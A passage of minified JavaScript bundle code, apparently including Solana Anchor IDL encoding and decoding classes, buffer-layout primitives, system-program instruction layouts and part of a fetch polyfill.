                  : i;
              return Rp.typeSize(r, e, s);
            };
            switch (o.type.kind) {
              case "struct":
                return yf(
                  o.type.fields,
                  () => [0],
                  (t) => t.map((t) => i(t.type)),
                  (t) => t.map((t) => i(t))
                ).reduce((t, e) => t + e, 0);
              case "enum": {
                const t = o.type.variants.map((t) =>
                  yf(
                    t.fields,
                    () => [0],
                    (t) => t.map((t) => i(t.type)),
                    (t) => t.map((t) => i(t))
                  ).reduce((t, e) => t + e, 0)
                );
                return Math.max(...t) + 1;
              }
              case "type":
                return Rp.typeSize(o.type.alias, e, n);
            }
          }
          if ("generic" in t) {
            const r = null == n ? void 0 : n.at(0);
            if ("type" !== (null == r ? void 0 : r.kind))
              throw new Tp(`Invalid generic: ${t.generic}`);
            return Rp.typeSize(r.type, e, n);
          }
          throw new Error(`Invalid type ${JSON.stringify(t)}`);
      }
    }
    static resolveArrayLen(t, e) {
      if ("number" == typeof t) return t;
      if (e) {
        const n = e.find((t) => "const" === t.kind);
        "const" === (null == n ? void 0 : n.kind) && (t = +n.value);
      }
      if ("number" != typeof t)
        throw new Tp("Generic array length did not resolve");
      return t;
    }
    static resolveGenericArgs({
      type: t,
      typeDef: e,
      genericArgs: n,
      isDefined: r,
    }) {
      if ("object" != typeof t) return null;
      for (const o in e.generics) {
        const i = e.generics[o];
        if ("generic" in t && i.name === t.generic) return [n[o]];
        if ("option" in t) {
          const o = Rp.resolveGenericArgs({
            type: t.option,
            typeDef: e,
            genericArgs: n,
            isDefined: r,
          });
          if (!o || !r) return o;
          if ("type" === o[0].kind)
            return [{ kind: "type", type: { option: o[0].type } }];
        }
        if ("vec" in t) {
          const o = Rp.resolveGenericArgs({
            type: t.vec,
            typeDef: e,
            genericArgs: n,
            isDefined: r,
          });
          if (!o || !r) return o;
          if ("type" === o[0].kind)
            return [{ kind: "type", type: { vec: o[0].type } }];
        }
        if ("array" in t) {
          const [s, a] = t.array,
            u = "object" == typeof a,
            c =
              Rp.resolveGenericArgs({
                type: s,
                typeDef: e,
                genericArgs: n,
                isDefined: r,
              }) || [];
          if (u) {
            const t = e.generics.findIndex((t) => t.name === a.generic);
            -1 !== t && c.push(n[t]);
          }
          if (c.length > 0) {
            if (!r) return c;
            if ("type" === c[0].kind && "const" === c[1].kind)
              return [
                { kind: "type", type: { array: [c[0].type, +c[1].value] } },
              ];
          }
          if (u && i.name === a.generic) {
            const t = n[o];
            return r ? [{ kind: "type", type: { array: [s, +t.value] } }] : [t];
          }
          return null;
        }
        if ("defined" in t)
          return t.defined.generics
            ? t.defined.generics
                .flatMap((t) => {
                  switch (t.kind) {
                    case "type":
                      return Rp.resolveGenericArgs({
                        type: t.type,
                        typeDef: e,
                        genericArgs: n,
                        isDefined: !0,
                      });
                    case "const":
                      return [t];
                  }
                })
                .filter((t) => null !== t)
            : null;
      }
      return null;
    }
  }
  class Mp {
    constructor(t) {
      this.idl = t;
      const e = t.instructions.map((e) => {
        const n = e.name,
          r = e.args.map((e) => Rp.fieldLayout(e, t.types)),
          o = Fl.struct(r, n);
        return [n, { discriminator: e.discriminator, layout: o }];
      });
      this.ixLayouts = new Map(e);
    }
    encode(t, e) {
      const n = ft.alloc(1e3),
        r = this.ixLayouts.get(t);
      if (!r) throw new Error(`Unknown method: ${t}`);
      const o = r.layout.encode(e, n),
        i = n.slice(0, o);
      return ft.concat([ft.from(r.discriminator), i]);
    }
    decode(t, e = "hex") {
      "string" == typeof t &&
        (t = "hex" === e ? ft.from(t, "hex") : Ol.decode(t));
      for (const [n, r] of this.ixLayouts) {
        const e = t.subarray(0, r.discriminator.length);
        if (e.equals(ft.from(r.discriminator)))
          return { name: n, data: r.layout.decode(t.subarray(e.length)) };
      }
      return null;
    }
    format(t, e) {
      return Lp.format(t, e, this.idl);
    }
  }
  class Lp {
    static format(t, e, n) {
      const r = n.instructions.find((e) => t.name === e.name);
      if (!r) return void 0, null;
      const o = r.args.map((e) => ({
          name: e.name,
          type: Lp.formatIdlType(e.type),
          data: Lp.formatIdlData(e, t.data[e.name], n.types),
        })),
        i = Lp.flattenIdlAccounts(r.accounts);
      return {
        args: o,
        accounts: e.map((t, e) =>
          e < i.length ? { name: i[e].name, ...t } : { name: void 0, ...t }
        ),
      };
    }
    static formatIdlType(t) {
      if ("string" == typeof t) return t;
      if ("option" in t) return `Option<${this.formatIdlType(t.option)}>`;
      if ("coption" in t) return `COption<${this.formatIdlType(t.coption)}>`;
      if ("vec" in t) return `Vec<${this.formatIdlType(t.vec)}>`;
      if ("array" in t) return `Array<${t.array[0]}; ${t.array[1]}>`;
      if ("defined" in t) {
        const e = t.defined.name;
        if (t.defined.generics) {
          return `${e}<${t.defined.generics
            .map((t) => {
              switch (t.kind) {
                case "type":
                  return Lp.formatIdlType(t.type);
                case "const":
                  return t.value;
              }
            })
            .join(", ")}>`;
        }
        return e;
      }
      throw new Error(`Unknown IDL type: ${t}`);
    }
    static formatIdlData(t, e, n) {
      if ("string" == typeof t.type) return e.toString();
      if ("vec" in t.type)
        return (
          "[" +
          e
            .map((e) =>
              this.formatIdlData({ name: "", type: t.type.vec }, e, n)
            )
            .join(", ") +
          "]"
        );
      if ("option" in t.type)
        return null === e
          ? "null"
          : this.formatIdlData({ name: "", type: t.type.option }, e, n);
      if ("defined" in t.type) {
        if (!n) throw new Error("User defined types not provided");
        const r = t.type.defined.name,
          o = n.find((t) => t.name === r);
        if (!o) throw new Error(`Type not found: ${r}`);
        return Lp.formatIdlDataDefined(o, e, n);
      }
      return "unknown";
    }
    static formatIdlDataDefined(t, e, n) {
      switch (t.type.kind) {
        case "struct":
          return (
            "{ " +
            yf(
              t.type.fields,
              () => "",
              (t) =>
                Object.entries(e)
                  .map(([e, r]) => {
                    const o = t.find((t) => t.name === e);
                    if (!o) throw new Error(`Field not found: ${e}`);
                    return e + ": " + Lp.formatIdlData(o, r, n);
                  })
                  .join(", "),
              (t) =>
                Object.entries(e)
                  .map(
                    ([e, r]) =>
                      e +
                      ": " +
                      Lp.formatIdlData({ name: "", type: t[e] }, r, n)
                  )
                  .join(", ")
            ) +
            " }"
          );
        case "enum": {
          const r = Object.keys(e)[0],
            o = t.type.variants.find((t) => t.name === r);
          if (!o) throw new Error(`Unable to find variant: ${r}`);
          const i = e[r];
          return yf(
            o.fields,
            () => r,
            (t) => {
              const e = Object.keys(i)
                .map((e) => {
                  const r = i[e],
                    o = t.find((t) => t.name === e);
                  if (!o) throw new Error(`Field not found: ${e}`);
                  return e + ": " + Lp.formatIdlData(o, r, n);
                })
                .join(", ");
              return `${r} { ${e} }`;
            },
            (t) => {
              const e = Object.entries(i)
                .map(
                  ([e, r]) =>
                    e + ": " + Lp.formatIdlData({ name: "", type: t[e] }, r, n)
                )
                .join(", ");
              return `${r} { ${e} }`;
            }
          );
        }
        case "type":
          return Lp.formatIdlType(t.type.alias);
      }
    }
    static flattenIdlAccounts(t, e) {
      return t
        .map((t) => {
          const n = (function (t) {
            const e = t.replace(/([A-Z])/g, " $1");
            return e.charAt(0).toUpperCase() + e.slice(1);
          })(t.name);
          if (t.hasOwnProperty("accounts")) {
            const r = e ? `${e} > ${n}` : n;
            return Lp.flattenIdlAccounts(t.accounts, r);
          }
          return { ...t, name: e ? `${e} > ${n}` : n };
        })
        .flat();
    }
  }
  class Np {
    constructor(t) {
      if (((this.idl = t), !t.accounts))
        return (this.accountLayouts = new Map()), void 0;
      const e = t.types;
      if (!e) throw new Error("Accounts require `idl.types`");
      const n = t.accounts.map((t) => {
        const n = e.find((e) => e.name === t.name);
        if (!n) throw new Error(`Account not found: ${t.name}`);
        return [
          t.name,
          {
            discriminator: t.discriminator,
            layout: Rp.typeDefLayout({ typeDef: n, types: e }),
          },
        ];
      });
      this.accountLayouts = new Map(n);
    }
    async encode(t, e) {
      const n = ft.alloc(1e3),
        r = this.accountLayouts.get(t);
      if (!r) throw new Error(`Unknown account: ${t}`);
      const o = r.layout.encode(e, n),
        i = n.slice(0, o),
        s = this.accountDiscriminator(t);
      return ft.concat([s, i]);
    }
    decode(t, e) {
      const n = this.accountDiscriminator(t);
      if (n.compare(e.slice(0, n.length)))
        throw new Error("Invalid account discriminator");
      return this.decodeUnchecked(t, e);
    }
    decodeAny(t) {
      for (const [e, n] of this.accountLayouts) {
        if (
          t.subarray(0, n.discriminator.length).equals(ft.from(n.discriminator))
        )
          return this.decodeUnchecked(e, t);
      }
      throw new Error("Account not found");
    }
    decodeUnchecked(t, e) {
      const n = this.accountDiscriminator(t),
        r = e.subarray(n.length),
        o = this.accountLayouts.get(t);
      if (!o) throw new Error(`Unknown account: ${t}`);
      return o.layout.decode(r);
    }
    memcmp(t, e) {
      const n = this.accountDiscriminator(t);
      return { offset: 0, bytes: Ol.encode(e ? ft.concat([n, e]) : n) };
    }
    size(t) {
      return (
        this.accountDiscriminator(t).length +
        Rp.typeSize({ defined: { name: t } }, this.idl)
      );
    }
    accountDiscriminator(t) {
      var e;
      const n =
        null === (e = this.idl.accounts) || void 0 === e
          ? void 0
          : e.find((e) => e.name === t);
      if (!n) throw new Error(`Account not found: ${t}`);
      return ft.from(n.discriminator);
    }
  }
  class Dp {
    constructor(t) {
      if (!t.events) return (this.layouts = new Map()), void 0;
      const e = t.types;
      if (!e) throw new Error("Events require `idl.types`");
      const n = t.events.map((t) => {
        const n = e.find((e) => e.name === t.name);
        if (!n) throw new Error(`Event not found: ${t.name}`);
        return [
          t.name,
          {
            discriminator: t.discriminator,
            layout: Rp.typeDefLayout({ typeDef: n, types: e }),
          },
        ];
      });
      this.layouts = new Map(n);
    }
    decode(t) {
      let e;
      try {
        e = pf(t);
      } catch (n) {
        return null;
      }
      for (const [r, o] of this.layouts) {
        const t = e.subarray(0, o.discriminator.length);
        if (t.equals(ft.from(o.discriminator)))
          return { name: r, data: o.layout.decode(e.subarray(t.length)) };
      }
      return null;
    }
  }
  class Up {
    constructor(t) {
      const e = t.types;
      if (!e) return (this.typeLayouts = new Map()), void 0;
      const n = e
        .filter((t) => !t.generics)
        .map((t) => [t.name, Rp.typeDefLayout({ typeDef: t, types: e })]);
      this.typeLayouts = new Map(n);
    }
    encode(t, e) {
      const n = ft.alloc(1e3),
        r = this.typeLayouts.get(t);
      if (!r) throw new Error(`Unknown type: ${t}`);
      const o = r.encode(e, n);
      return n.slice(0, o);
    }
    decode(t, e) {
      const n = this.typeLayouts.get(t);
      if (!n) throw new Error(`Unknown type: ${t}`);
      return n.decode(e);
    }
  }
  class qp {
    constructor(t) {
      (this.instruction = new Mp(t)),
        (this.accounts = new Np(t)),
        (this.events = new Dp(t)),
        (this.types = new Up(t));
    }
  }
  class zp {
    constructor(t, e) {
      if (!Number.isInteger(t)) throw new TypeError("span must be an integer");
      (this.span = t), (this.property = e);
    }
    makeDestinationObject() {
      return {};
    }
    decode(t, e) {
      throw new Error("Layout is abstract");
    }
    encode(t, e, n) {
      throw new Error("Layout is abstract");
    }
    getSpan(t, e) {
      if (0 > this.span) throw new RangeError("indeterminate span");
      return this.span;
    }
    replicate(t) {
      const e = Object.create(this.constructor.prototype);
      return Object.assign(e, this), (e.property = t), e;
    }
    fromArray(t) {}
  }
  var Kp = zp;
  class Wp extends zp {
    isCount() {
      throw new Error("ExternalLayout is abstract");
    }
  }
  class Fp extends Wp {
    constructor(t, e, n) {
      if (!(t instanceof zp)) throw new TypeError("layout must be a Layout");
      if (void 0 === e) e = 0;
      else if (!Number.isInteger(e))
        throw new TypeError("offset must be integer or undefined");
      super(t.span, n || t.property), (this.layout = t), (this.offset = e);
    }
    isCount() {
      return this.layout instanceof jp || this.layout instanceof Gp;
    }
    decode(t, e) {
      return void 0 === e && (e = 0), this.layout.decode(t, e + this.offset);
    }
    encode(t, e, n) {
      return void 0 === n && (n = 0), this.layout.encode(t, e, n + this.offset);
    }
  }
  class jp extends zp {
    constructor(t, e) {
      if ((super(t, e), 6 < this.span))
        throw new RangeError("span must not exceed 6 bytes");
    }
    decode(t, e) {
      return void 0 === e && (e = 0), t.readUIntLE(e, this.span);
    }
    encode(t, e, n) {
      return void 0 === n && (n = 0), e.writeUIntLE(t, n, this.span), this.span;
    }
  }
  class Gp extends zp {
    constructor(t, e) {
      if ((super(t, e), 6 < this.span))
        throw new RangeError("span must not exceed 6 bytes");
    }
    decode(t, e) {
      return void 0 === e && (e = 0), t.readUIntBE(e, this.span);
    }
    encode(t, e, n) {
      return void 0 === n && (n = 0), e.writeUIntBE(t, n, this.span), this.span;
    }
  }
  const Vp = Math.pow(2, 32);
  function Hp(t) {
    const e = Math.floor(t / Vp);
    return { hi32: e, lo32: t - e * Vp };
  }
  function Zp(t, e) {
    return t * Vp + e;
  }
  class Xp extends zp {
    constructor(t) {
      super(8, t);
    }
    decode(t, e) {
      void 0 === e && (e = 0);
      const n = t.readUInt32LE(e);
      return Zp(t.readUInt32LE(e + 4), n);
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      const r = Hp(t);
      return e.writeUInt32LE(r.lo32, n), e.writeUInt32LE(r.hi32, n + 4), 8;
    }
  }
  class Jp extends zp {
    constructor(t) {
      super(8, t);
    }
    decode(t, e) {
      void 0 === e && (e = 0);
      const n = t.readUInt32LE(e);
      return Zp(t.readInt32LE(e + 4), n);
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      const r = Hp(t);
      return e.writeUInt32LE(r.lo32, n), e.writeInt32LE(r.hi32, n + 4), 8;
    }
  }
  class Yp extends zp {
    constructor(t, e, n) {
      if (!Array.isArray(t) || !t.reduce((t, e) => t && e instanceof zp, !0))
        throw new TypeError("fields must be array of Layout instances");
      "boolean" == typeof e && void 0 === n && ((n = e), (e = void 0));
      for (const i of t)
        if (0 > i.span && void 0 === i.property)
          throw new Error(
            "fields cannot contain unnamed variable-length layout"
          );
      let r = -1;
      try {
        r = t.reduce((t, e) => t + e.getSpan(), 0);
      } catch (o) {}
      super(r, e), (this.fields = t), (this.decodePrefixes = !!n);
    }
    getSpan(t, e) {
      if (0 <= this.span) return this.span;
      void 0 === e && (e = 0);
      let n = 0;
      try {
        n = this.fields.reduce((n, r) => {
          const o = r.getSpan(t, e);
          return (e += o), n + o;
        }, 0);
      } catch (r) {
        throw new RangeError("indeterminate span");
      }
      return n;
    }
    decode(t, e) {
      void 0 === e && (e = 0);
      const n = this.makeDestinationObject();
      for (const r of this.fields)
        if (
          (void 0 !== r.property && (n[r.property] = r.decode(t, e)),
          (e += r.getSpan(t, e)),
          this.decodePrefixes && t.length === e)
        )
          break;
      return n;
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      const r = n;
      let o = 0,
        i = 0;
      for (const s of this.fields) {
        let r = s.span;
        if (((i = 0 < r ? r : 0), void 0 !== s.property)) {
          const o = t[s.property];
          void 0 !== o &&
            ((i = s.encode(o, e, n)), 0 > r && (r = s.getSpan(e, n)));
        }
        (o = n), (n += r);
      }
      return o + i - r;
    }
    fromArray(t) {
      const e = this.makeDestinationObject();
      for (const n of this.fields)
        void 0 !== n.property && 0 < t.length && (e[n.property] = t.shift());
      return e;
    }
    layoutFor(t) {
      if ("string" != typeof t) throw new TypeError("property must be string");
      for (const e of this.fields) if (e.property === t) return e;
    }
    offsetOf(t) {
      if ("string" != typeof t) throw new TypeError("property must be string");
      let e = 0;
      for (const n of this.fields) {
        if (n.property === t) return e;
        0 > n.span ? (e = -1) : 0 <= e && (e += n.span);
      }
    }
  }
  class Qp {
    constructor(t) {
      this.property = t;
    }
    decode() {
      throw new Error("UnionDiscriminator is abstract");
    }
    encode() {
      throw new Error("UnionDiscriminator is abstract");
    }
  }
  class $p extends Qp {
    constructor(t, e) {
      if (!(t instanceof Wp && t.isCount()))
        throw new TypeError(
          "layout must be an unsigned integer ExternalLayout"
        );
      super(e || t.property || "variant"), (this.layout = t);
    }
    decode(t, e) {
      return this.layout.decode(t, e);
    }
    encode(t, e, n) {
      return this.layout.encode(t, e, n);
    }
  }
  class tm extends zp {
    constructor(t, e, n) {
      const r = t instanceof jp || t instanceof Gp;
      if (r) t = new $p(new Fp(t));
      else if (t instanceof Wp && t.isCount()) t = new $p(t);
      else if (!(t instanceof Qp))
        throw new TypeError(
          "discr must be a UnionDiscriminator or an unsigned integer layout"
        );
      if ((void 0 === e && (e = null), !(null === e || e instanceof zp)))
        throw new TypeError("defaultLayout must be null or a Layout");
      if (null !== e) {
        if (0 > e.span)
          throw new Error("defaultLayout must have constant span");
        void 0 === e.property && (e = e.replicate("content"));
      }
      let o = -1;
      e && ((o = e.span), 0 <= o && r && (o += t.layout.span)),
        super(o, n),
        (this.discriminator = t),
        (this.usesPrefixDiscriminator = r),
        (this.defaultLayout = e),
        (this.registry = {});
      let i = this.defaultGetSourceVariant.bind(this);
      (this.getSourceVariant = function (t) {
        return i(t);
      }),
        (this.configGetSourceVariant = function (t) {
          i = t.bind(this);
        });
    }
    getSpan(t, e) {
      if (0 <= this.span) return this.span;
      void 0 === e && (e = 0);
      const n = this.getVariant(t, e);
      if (!n)
        throw new Error("unable to determine span for unrecognized variant");
      return n.getSpan(t, e);
    }
    defaultGetSourceVariant(t) {
      if (t.hasOwnProperty(this.discriminator.property)) {
        if (this.defaultLayout && t.hasOwnProperty(this.defaultLayout.property))
          return;
        const e = this.registry[t[this.discriminator.property]];
        if (e && (!e.layout || t.hasOwnProperty(e.property))) return e;
      } else
        for (const e in this.registry) {
          const n = this.registry[e];
          if (t.hasOwnProperty(n.property)) return n;
        }
      throw new Error("unable to infer src variant");
    }
    decode(t, e) {
      let n;
      void 0 === e && (e = 0);
      const r = this.discriminator,
        o = r.decode(t, e);
      let i = this.registry[o];
      if (void 0 === i) {
        let s = 0;
        (i = this.defaultLayout),
          this.usesPrefixDiscriminator && (s = r.layout.span),
          (n = this.makeDestinationObject()),
          (n[r.property] = o),
          (n[i.property] = this.defaultLayout.decode(t, e + s));
      } else n = i.decode(t, e);
      return n;
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      const r = this.getSourceVariant(t);
      if (void 0 === r) {
        const r = this.discriminator,
          o = this.defaultLayout;
        let i = 0;
        return (
          this.usesPrefixDiscriminator && (i = r.layout.span),
          r.encode(t[r.property], e, n),
          i + o.encode(t[o.property], e, n + i)
        );
      }
      return r.encode(t, e, n);
    }
    addVariant(t, e, n) {
      const r = new em(this, t, e, n);
      return (this.registry[t] = r), r;
    }
    getVariant(t, e) {
      let n = t;
      return (
        dt.isBuffer(t) &&
          (void 0 === e && (e = 0), (n = this.discriminator.decode(t, e))),
        this.registry[n]
      );
    }
  }
  class em extends zp {
    constructor(t, e, n, r) {
      if (!(t instanceof tm)) throw new TypeError("union must be a Union");
      if (!Number.isInteger(e) || 0 > e)
        throw new TypeError("variant must be a (non-negative) integer");
      if (("string" == typeof n && void 0 === r && ((r = n), (n = null)), n)) {
        if (!(n instanceof zp)) throw new TypeError("layout must be a Layout");
        if (
          null !== t.defaultLayout &&
          0 <= n.span &&
          n.span > t.defaultLayout.span
        )
          throw new Error("variant span exceeds span of containing union");
        if ("string" != typeof r)
          throw new TypeError("variant must have a String property");
      }
      let o = t.span;
      0 > t.span &&
        ((o = n ? n.span : 0),
        0 <= o &&
          t.usesPrefixDiscriminator &&
          (o += t.discriminator.layout.span)),
        super(o, r),
        (this.union = t),
        (this.variant = e),
        (this.layout = n || null);
    }
    getSpan(t, e) {
      if (0 <= this.span) return this.span;
      void 0 === e && (e = 0);
      let n = 0;
      return (
        this.union.usesPrefixDiscriminator &&
          (n = this.union.discriminator.layout.span),
        n + this.layout.getSpan(t, e + n)
      );
    }
    decode(t, e) {
      const n = this.makeDestinationObject();
      if ((void 0 === e && (e = 0), this !== this.union.getVariant(t, e)))
        throw new Error("variant mismatch");
      let r = 0;
      return (
        this.union.usesPrefixDiscriminator &&
          (r = this.union.discriminator.layout.span),
        this.layout
          ? (n[this.property] = this.layout.decode(t, e + r))
          : this.property
          ? (n[this.property] = !0)
          : this.union.usesPrefixDiscriminator &&
            (n[this.union.discriminator.property] = this.variant),
        n
      );
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      let r = 0;
      if (
        (this.union.usesPrefixDiscriminator &&
          (r = this.union.discriminator.layout.span),
        this.layout && !t.hasOwnProperty(this.property))
      )
        throw new TypeError("variant lacks property " + this.property);
      this.union.discriminator.encode(this.variant, e, n);
      let o = r;
      if (
        this.layout &&
        (this.layout.encode(t[this.property], e, n + r),
        (o += this.layout.getSpan(e, n + r)),
        0 <= this.union.span && o > this.union.span)
      )
        throw new Error("encoded variant overruns containing union");
      return o;
    }
    fromArray(t) {
      if (this.layout) return this.layout.fromArray(t);
    }
  }
  let nm = class extends zp {
    constructor(t, e) {
      if (
        !((t instanceof Wp && t.isCount()) || (Number.isInteger(t) && 0 <= t))
      )
        throw new TypeError(
          "length must be positive integer or an unsigned integer ExternalLayout"
        );
      let n = -1;
      t instanceof Wp || (n = t), super(n, e), (this.length = t);
    }
    getSpan(t, e) {
      let n = this.span;
      return 0 > n && (n = this.length.decode(t, e)), n;
    }
    decode(t, e) {
      void 0 === e && (e = 0);
      let n = this.span;
      return 0 > n && (n = this.length.decode(t, e)), t.slice(e, e + n);
    }
    encode(t, e, n) {
      let r = this.length;
      if (
        (this.length instanceof Wp && (r = t.length),
        !dt.isBuffer(t) || r !== t.length)
      )
        throw new TypeError(
          ((o = "Blob.encode"),
          ((i = this).property ? o + "[" + i.property + "]" : o) +
            " requires (length " +
            r +
            ") Buffer as src")
        );
      var o, i;
      if (n + r > e.length) throw new RangeError("encoding overruns Buffer");
      return (
        e.write(t.toString("hex"), n, r, "hex"),
        this.length instanceof Wp && this.length.encode(r, e, n),
        r
      );
    }
  };
  var rm = (t, e, n) => new Fp(t, e, n),
    om = (t) => new jp(4, t),
    im = (t) => new Jp(t),
    sm = (t, e, n) => new Yp(t, e, n),
    am = (t, e, n) => new tm(t, e, n),
    um = (t, e) => new nm(t, e);
  class cm extends Kp {
    constructor(t) {
      super(-1, t),
        (this.property = t),
        (this.layout = sm(
          [om("length"), om("lengthPadding"), um(rm(om(), -8), "chars")],
          this.property
        ));
    }
    encode(t, e, n = 0) {
      if (null == t) return this.layout.span;
      const r = { chars: dt.from(t, "utf8") };
      return this.layout.encode(r, e, n);
    }
    decode(t, e = 0) {
      return this.layout.decode(t, e).chars.toString();
    }
    getSpan(t, e = 0) {
      return (
        om().span +
        om().span +
        new Yn(new Uint8Array(t).slice(e, e + 4), 10, "le").toNumber()
      );
    }
  }
  function lm(t) {
    return new cm(t);
  }
  function dm(t) {
    return um(32, t);
  }
  const fm = am(om("instruction"));
  fm.addVariant(
    0,
    sm([im("lamports"), im("space"), dm("owner")]),
    "createAccount"
  ),
    fm.addVariant(1, sm([dm("owner")]), "assign"),
    fm.addVariant(2, sm([im("lamports")]), "transfer"),
    fm.addVariant(
      3,
      sm([dm("base"), lm("seed"), im("lamports"), im("space"), dm("owner")]),
      "createAccountWithSeed"
    ),
    fm.addVariant(4, sm([dm("authorized")]), "advanceNonceAccount"),
    fm.addVariant(5, sm([im("lamports")]), "withdrawNonceAccount"),
    fm.addVariant(6, sm([dm("authorized")]), "initializeNonceAccount"),
    fm.addVariant(7, sm([dm("authorized")]), "authorizeNonceAccount"),
    fm.addVariant(8, sm([im("space")]), "allocate"),
    fm.addVariant(
      9,
      sm([dm("base"), lm("seed"), im("space"), dm("owner")]),
      "allocateWithSeed"
    ),
    fm.addVariant(
      10,
      sm([dm("base"), lm("seed"), dm("owner")]),
      "assignWithSeed"
    ),
    fm.addVariant(
      11,
      sm([im("lamports"), lm("seed"), dm("owner")]),
      "transferWithSeed"
    ),
    Math.max(...Object.values(fm.registry).map((t) => t.span));
  class hm extends Kp {
    constructor(t, e, n, r) {
      super(t.span, r),
        (this.layout = t),
        (this.decoder = e),
        (this.encoder = n);
    }
    decode(t, e) {
      return this.decoder(this.layout.decode(t, e));
    }
    encode(t, e, n) {
      return this.layout.encode(this.encoder(t), e, n);
    }
    getSpan(t, e) {
      return this.layout.getSpan(t, e);
    }
  }
  function pm(t) {
    return new hm(
      um(32),
      (t) => new Ji(t),
      (t) => t.toBuffer(),
      t
    );
  }
  var mm;
  sm([
    om("version"),
    om("state"),
    pm("authorizedPubkey"),
    pm("nonce"),
    sm([((mm = "lamportsPerSignature"), new Xp(mm))], "feeCalculator"),
  ]),
    new Ji("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
    new Ji("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
  var gm = { exports: {} };
  !(function (t, e) {
    var n,
      r = "undefined" != typeof self ? self : $f,
      o = (function () {
        function t() {
          (this.fetch = !1), (this.DOMException = r.DOMException);
        }
        return (t.prototype = r), new t();
      })();
    (n = o),
      void !(function (t) {
        var e = "URLSearchParams" in n,
          r = "Symbol" in n && "iterator" in Symbol,
          o =
            "FileReader" in n &&
            "Blob" in n &&
            (function () {
              try {
                return new Blob(), !0;
              } catch (t) {
                return !1;
              }
            })(),
          i = "FormData" in n,
          s = "ArrayBuffer" in n;
        if (s)
          var a = [
              "[object Int8Array]",
              "[object Uint8Array]",
              "[object Uint8ClampedArray]",
              "[object Int16Array]",
              "[object Uint16Array]",
              "[object Int32Array]",
              "[object Uint32Array]",
              "[object Float32Array]",
              "[object Float64Array]",
            ],
            u =
              ArrayBuffer.isView ||
              function (t) {
                return t && a.indexOf(Object.prototype.toString.call(t)) > -1;
              };
        function c(t) {
          if (
            ("string" != typeof t && (t = String(t)),
            /[^a-z0-9\-#$%&'*+.^_`|~]/i.test(t))
          )
            throw new TypeError("Invalid character in header field name");
          return t.toLowerCase();
        }
        function l(t) {
          return "string" != typeof t && (t = String(t)), t;
        }
        function d(t) {
          var e = {
            next: function () {
              var e = t.shift();
              return { done: void 0 === e, value: e };
            },
          };
          return (
            r &&
              (e[Symbol.iterator] = function () {
                return e;
              }),
            e
          );
        }
        function f(t) {
          (this.map = {}),
            t instanceof f
              ? t.forEach(function (t, e) {
                  this.append(e, t);
                }, this)
              : Array.isArray(t)
              ? t.forEach(function (t) {
                  this.append(t[0], t[1]);
                }, this)
              : t &&
                Object.getOwnPropertyNames(t).forEach(function (e) {
                  this.append(e, t[e]);
                }, this);
        }
        function h(t) {
          if (t.bodyUsed) return Promise.reject(new TypeError("Already read"));
          t.bodyUsed = !0;
        }
        function p(t) {
          return new Promise(function (e, n) {
            (t.onload = function () {
              e(t.result);
            }),
              (t.onerror = function () {
                n(t.error);
              });
          });
        }
        function m(t) {
          var e = new FileReader(),
            n = p(e);
          return e.readAsArrayBuffer(t), n;
        }
        function g(t) {
          if (t.slice) return t.slice(0);
          var e = new Uint8Array(t.byteLength);
          return e.set(new Uint8Array(t)), e.buffer;
        }
        function y() {
          return (
            (this.bodyUsed = !1),
            (this._initBody = function (t) {
              var n;
              (this._bodyInit = t),
                t
                  ? "string" == typeof t
                    ? (this._bodyText = t)
                    : o && Blob.prototype.isPrototypeOf(t)
                    ? (this._bodyBlob = t)
                    : i && FormData.prototype.isPrototypeOf(t)
                    ? (this._bodyFormData = t)
                    : e && URLSearchParams.prototype.isPrototypeOf(t)
                    ? (this._bodyText = t.toString())
                    : s && o && (n = t) && DataView.prototype.isPrototypeOf(n)
                    ? ((this._bodyArrayBuffer = g(t.buffer)),
                      (this._bodyInit = new Blob([this._bodyArrayBuffer])))
                    : s && (ArrayBuffer.prototype.isPrototypeOf(t) || u(t))
                    ? (this._bodyArrayBuffer = g(t))
                    : (this._bodyText = t = Object.prototype.toString.call(t))
                  : (this._bodyText = ""),
                this.headers.get("content-type") ||
                  ("string" == typeof t
                    ? this.headers.set(
                        "content-type",
                        "text/plain;charset=UTF-8"
                      )
                    : this._bodyBlob && this._bodyBlob.type
                    ? this.headers.set("content-type", this._bodyBlob.type)
                    : e &&
                      URLSearchParams.prototype.isPrototypeOf(t) &&
                      this.headers.set(
                        "content-type",
                        "application/x-www-form-urlencoded;charset=UTF-8"
                      ));
            }),
            o &&
              ((this.blob = function () {
                var t = h(this);
                if (t) return t;
                if (this._bodyBlob) return Promise.resolve(this._bodyBlob);
                if (this._bodyArrayBuffer)
                  return Promise.resolve(new Blob([this._bodyArrayBuffer]));
                if (this._bodyFormData)
                  throw new Error("could not read FormData body as blob");
                return Promise.resolve(new Blob([this._bodyText]));
              }),
              (this.arrayBuffer = function () {
                return this._bodyArrayBuffer
                  ? h(this) || Promise.resolve(this._bodyArrayBuffer)
                  : this.blob().then(m);
              })),
            (this.text = function () {
              var t,
                e,
                n,
                r = h(this);
              if (r) return r;
              if (this._bodyBlob)
                return (
                  (t = this._bodyBlob),
                  (e = new FileReader()),
                  (n = p(e)),
                  e.readAsText(t),
                  n
                );
              if (this._bodyArrayBuffer)
                return Promise.resolve(
                  (function (t) {
                    for (
                      var e = new Uint8Array(t), n = new Array(e.length), r = 0;
                      r < e.length;
                      r++
                    )
                      n[r] = String.fromCharCode(e[r]);
                    return n.join("");
                  })(this._bodyArrayBuffer)
                );
              if (this._bodyFormData)
                throw new Error("could not read FormData body as text");
              return Promise.resolve(this._bodyText);
            }),
            i &&
              (this.formData = function () {
                return this.text().then(v);
              }),
            (this.json = function () {
              return this.text().then(JSON.parse);
            }),
            this
          );
        }
        (f.prototype.append = function (t, e) {
          (t = c(t)), (e = l(e));
          var n = this.map[t];
          this.map[t] = n ? n + ", " + e : e;
        }),
          (f.prototype.delete = function (t) {
            delete this.map[c(t)];
          }),
          (f.prototype.get = function (t) {
            return (t = c(t)), this.has(t) ? this.map[t] : null;
          }),
          (f.prototype.has = function (t) {
            return this.map.hasOwnProperty(c(t));
          }),
          (f.prototype.set = function (t, e) {
            this.map[c(t)] = l(e);
          }),
          (f.prototype.forEach = function (t, e) {
            for (var n in this.map)
